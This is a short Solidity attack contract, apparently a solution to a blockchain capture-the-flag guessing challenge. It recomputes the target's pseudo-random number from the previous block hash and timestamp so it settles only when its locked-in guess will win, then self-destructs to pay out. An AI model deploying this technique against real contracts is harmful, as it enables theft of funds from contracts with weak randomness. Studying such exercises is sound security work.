interface Challenge {
    function lockInGuess(uint8) external payable;
    function settle() external;
}

contract Guesser {
    Challenge public target;
    address public owner;
    uint8 public answer;

    function Guesser(address _target, uint8 _answer) public payable {
        require(msg.value == 1 ether);
        
        target = Challenge(_target);
        owner = msg.sender;
        
        answer = _answer % 10;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    function lock() public onlyOwner {
        target.lockInGuess.value(1 ether)(answer);
    }
    
    function guess() public onlyOwner {
        require(answer == predict());
        
        target.settle();
    }
    
    function clear() public onlyOwner {
        selfdestruct(owner);
    }

    function predict() public view returns (uint8) {
        return uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
    }
    
    function() external payable {}
}
